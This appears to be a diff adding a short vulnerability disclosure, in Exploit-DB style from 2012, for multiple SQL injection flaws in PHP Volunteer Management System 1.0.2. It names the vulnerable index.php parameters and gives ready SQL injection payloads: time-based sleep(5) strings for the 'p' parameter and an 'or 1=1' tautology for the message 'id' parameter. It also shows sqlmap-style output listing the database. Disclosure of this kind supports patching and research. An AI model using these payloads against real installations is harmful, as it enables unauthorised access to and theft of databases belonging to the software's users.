@@ -1,0 +1,38 @@
+# Title: PHP Volunteer Management System v 1.0.2 multiple SQLi Vulnerabilities
+# Version: 1.0.2
+# Author/Found by: loneferret
+# Software Site: https://sourceforge.net/projects/phpvolunteer/
+# Other vulnerabilities: http://www.exploit-db.com/exploits/18941/
+  
+# Date found: May 28th 2012
+# Tested on: Ubuntu Server 8.04 / PHP Version 5.2.4-2ubuntu5.23
+  
+# Vulnerability:
+# Due to improper sanitation, many of the parameters are injectable,
+# some need to be authenticated, others not.
+
+  
+# As always have fun...
+
+PoC:
+
+Page: index.php
+Parameter: ?p=
+Method: GET
+Payload: /?p=dashboard' and sleep(5) and '1'='1
+Payload: /?p=login' and sleep(5) and '1'='1
+
+Other affected parameters can be found in the message section of
+the application when reading or deleting a message.
+
+Parameter: id=
+Url: /?p=read_message&id=2
+Payload: /?p=read_message&id=-1' or '1'='1
+
+
+Possible output:
+[10:00:02] [INFO] searching database 'bf102'
+[10:00:02] [INFO] the SQL query used returns 1 entries
+[10:00:02] [INFO] resumed: "bf102"
+found databases [1]:                                  
+[*] bf102
